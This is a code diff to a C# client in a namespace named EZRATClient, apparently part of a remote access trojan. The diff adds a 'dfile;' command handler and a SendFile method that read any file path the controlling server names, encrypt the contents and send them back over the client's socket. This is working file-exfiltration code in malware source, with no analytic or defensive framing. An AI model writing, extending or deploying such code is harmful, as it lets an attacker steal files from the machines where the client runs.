@@ -287,6 +287,12 @@ namespace EZRATClient
                     SendCommand("chatdata;" + String.Join("¦",cht.Texted));
                 }
             }
+            else if (text.StartsWith("dfile;"))
+            {
+                string path = text.Substring(6);
+                SendFile(path);
+                
+            }
         }
 
 
@@ -371,7 +377,27 @@ namespace EZRATClient
             }
         }
 
+        public static void SendFile(string path)
+        {
+            if (!_clientSocket.Connected) //If the client isn't connected
+            {
+                Console.WriteLine("Socket is not connected!");
+                return; //Return
+            }
 
+
+            try
+            {
+                //_clientSocket.SendFile(path); //Send the data to the server
+                byte[] result = Encoding.Default.GetBytes(Encrypt("dfile;" + File.ReadAllText(path)));
+                _clientSocket.Send(result);
+            }
+            catch (Exception ex) //Failed to send data to the server
+            {
+                Console.WriteLine("Send File Failure " + ex.Message);
+                return; //Return
+            }
+        }
         public static void SendCommand(string response)
         {
             if (!_clientSocket.Connected) //If the client isn't connected
